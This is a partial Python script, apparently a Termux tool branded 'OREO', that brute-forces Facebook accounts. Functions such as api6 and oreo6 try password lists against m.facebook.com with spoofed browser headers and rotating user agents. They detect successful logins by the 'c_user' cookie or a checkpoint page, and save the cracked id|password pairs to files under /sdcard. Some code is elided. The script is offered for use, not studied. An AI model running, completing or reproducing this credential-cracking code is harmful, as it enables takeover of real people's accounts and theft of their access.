...
\x1b[1;93m═══════════════════════════════════════════════
\033[1;32m[√] CODED BY : \033[1;32mSHVNI ZUCCHINI 
[√] GITHUB   : \033[1;32mOREO-LEGEND             
[√] STATUS : \033[1;32mFREE TRAIL        
[√] VERSION  : \033[1;32m1.0                   
[√] FACEBOOK   : \033[1;32mOREO ZUCCHINI\033[1;37m              
\x1b[1;93m═══════════════════════════════════════════════""")
def linex():
	print(50*'_')
def clear():
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [OREO-FIRE] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116.0.5845.240"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [OREO-ALIVE] %s | %s'%(ids,pas))
				open('/sdcard/OREO-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in TRT:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [OREO-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/OREO-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def trt5(ids,passlist):
        ...
        try:
                ...
                pass
#method6
def oreo6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [OREO-LEGEND] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(ugen)
			...
			'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116.0.5845.240"',
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [OREO-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [OREO-OK] '+uid+' | '+pas)
						open('/sdcard/OREO-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [OREO-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/OREO-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
